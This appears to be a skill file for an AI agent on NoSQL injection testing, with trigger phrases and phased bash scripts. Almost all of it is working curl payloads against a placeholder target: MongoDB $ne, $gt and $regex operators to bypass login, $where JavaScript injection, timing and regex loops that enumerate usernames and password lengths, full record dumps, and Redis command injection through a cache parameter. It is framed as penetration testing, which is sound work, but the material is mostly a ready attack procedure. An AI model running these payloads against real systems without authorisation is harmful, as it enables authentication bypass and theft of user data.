---
name: vuln-nosql
description: "NoSQL injection testing — MongoDB operator injection ($ne/$gt/$where), authentication bypass, blind NoSQL injection, MongoDB aggregation abuse, Redis command injection. Triggers: 'nosql injection', 'mongodb injection', 'nosql', 'operator injection', '$ne injection', '$where injection', 'mongodb auth bypass', 'nosql auth bypass', 'mongodb exploit'."
---

# NoSQL Injection Testing

Exploit MongoDB operator abuse and JavaScript injection to bypass auth and exfiltrate data.

---

## Phase 1: MongoDB Operator Injection

```bash
TARGET="https://TARGET"

curl -s -X POST "$TARGET/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$ne":"invalid"}}'

curl -s -X POST "$TARGET/login" \
  -d 'username=admin&password[$ne]=invalid'

curl -s -X POST "$TARGET/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":{"$regex":".*"},"password":{"$ne":"x"}}'

# $gt bypass:
curl -s -X POST "$TARGET/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$gt":""}}'

# $where JavaScript injection:
curl -s -X POST "$TARGET/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","$where":"function(){sleep(5000);return true;}"}'
```

---

## Phase 2: Blind NoSQL via Timing

```bash
TARGET="https://TARGET"

for CHAR in a b c d e f g h i j k l m n o p q r s t u v w x y z 0 1 2 3 4 5 6 7 8 9; do
  START=$(date +%s%3N)
  curl -s -X POST "$TARGET/api/login" \
    -H "Content-Type: application/json" \
    -d "{\"username\":{\"\\$regex\":\"^${CHAR}\"},\"password\":{\"\\$ne\":\"x\"}}" -o /dev/null
  END=$(date +%s%3N)
  [ $((END - START)) -gt 100 ] && echo "Prefix match: $CHAR"
done

curl -s -X POST "$TARGET/api/users" \
  -H "Content-Type: application/json" \
  -d '{"username":{"$regex":"^admin"}}'

for LEN in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16; do
  RESP=$(curl -s -X POST "$TARGET/api/search" \
    -H "Content-Type: application/json" \
    -d "{\"password\":{\"\\$regex\":\".{$LEN}\"}}")
  echo "Length $LEN: $(echo $RESP | wc -c)"
done
```

---

## Phase 3: Data Exfiltration

```bash
TARGET="https://TARGET"

for CHAR in {a..z} {0..9}; do
  RESP=$(curl -s -X POST "$TARGET/api/search" \
    -H "Content-Type: application/json" \
    -d "{\"username\":{\"\\$regex\":\"^$CHAR\"},\"password\":{\"\\$ne\":\"x\"}}")
  [ "$(echo $RESP | wc -c)" -gt 10 ] && echo "Username starts with: $CHAR"
done

curl -s -X POST "$TARGET/api/search" \
  -H "Content-Type: application/json" \
  -d '{"$where":"1==1"}'

curl -s "$TARGET/api/users?username[$regex]=.*&username[$options]=i"
curl -s "$TARGET/api/users?username[$ne]=&password[$ne]="
```

---

## Phase 4: Redis Command Injection

```bash
TARGET="https://TARGET"

curl -s "$TARGET/api/cache?key=PING"
curl -s "$TARGET/api/cache?key=INFO"
curl -s "$TARGET/api/cache?key=CONFIG+GET+*"

```

---

## Output

Save to `output/`:
- `nosql_auth_bypass.txt` — auth bypass payloads that worked
- `nosql_enum.txt` — enumerated usernames/data

## Next Phase

→ `vuln-account-takeover` if auth bypass achieved
→ `pentest-report` to document findings
